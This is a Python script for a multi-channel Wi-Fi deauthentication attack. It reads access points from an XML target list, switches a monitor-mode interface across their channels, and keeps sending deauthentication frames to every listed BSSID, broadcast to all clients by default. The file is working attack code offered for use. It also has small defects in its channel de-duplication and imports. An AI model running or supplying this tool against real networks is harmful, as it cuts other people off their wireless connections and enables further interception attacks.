#!/usr/bin/env python
from monitormode import *
from deauth import *
import time

channels = []

def channel_exist(channel):
    for i in range(len(channels)):
        if channel == channels[i] :
            return 1
    return 0

def channel_set(channel, interface):
    print("[Interface]: %s switching to channel %d" %(interface, int(channel)))
    os.system("iw dev %s set channel %d" %(interface, int(channel)))

def multi_deauth(fileName,interface,client):
    apsList = ET.parse(fileName)
    aps = apsList.getroot()
    channels = []
    for ap in aps.findall('AccessPoint'):
        channel = str(ap.get('Channel'))
        if not channel_exist(channel):
            channels.append(channel)
    interface = monitor_up(interface)
    try:
        while True:
            for channel in range(0,len(channels)):
                channel_set(channels[channel],interface)
                for ap in aps.findall('AccessPoint'):
                    if str(ap.get('Channel')) == channels[channel]:
                        bssid = str(ap.findtext('BSSID'))
                        deauth(interface, bssid, client)
                time.sleep(2)
    except KeyboardInterrupt:
        interface = monitor_down(interface)

 
if __name__ == "__main__": 
    if (len(sys.argv) != 3) and (len(sys.argv) !=4):
        print('[Usage]: %s target_list interface client_mac' % sys.argv[0])
        print('[Usage]: empty client_mac default to broadcast mode')
        sys.exit(1)
    elif (len(sys.argv) == 3):
        aps_list = sys.argv[1]
        interface = sys.argv[2]
        client = 'FF:FF:FF:FF:FF:FF'
    elif (len(sys.argv) == 4):
        aps_list = sys.argv[1]
        interface = sys.argv[2]
        client = sys.argv[3]
    multi_deauth(aps_list,interface,client)
